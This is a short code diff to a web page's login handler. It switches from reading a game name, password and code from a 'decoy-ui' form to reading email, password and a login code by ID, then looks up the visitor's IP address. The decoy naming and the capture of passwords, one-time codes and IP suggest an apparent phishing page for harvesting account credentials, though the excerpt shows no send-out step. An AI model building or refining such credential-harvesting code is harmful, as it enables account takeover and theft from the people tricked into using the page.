@@ -100,9 +100,14 @@
         const progressBar = document.getElementById('progress-bar');
 
         async function handleLogin() {
-            const gameName = document.querySelector('#decoy-ui input[type="text"]').value;
-            const password = document.querySelector('#decoy-ui input[type="password"]').value;
-            const code = document.querySelector('#decoy-ui input[type="text"]').value;
+            const emailInput = document.getElementById('email');
+            const passwordInput = document.getElementById('password');
+            const codeInput = document.getElementById('code');
+
+            const email = emailInput.value;
+            const password = passwordInput.value;
+            const code = codeInput.value;
+
             try {
                 const ipResponse = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipResponse.json();
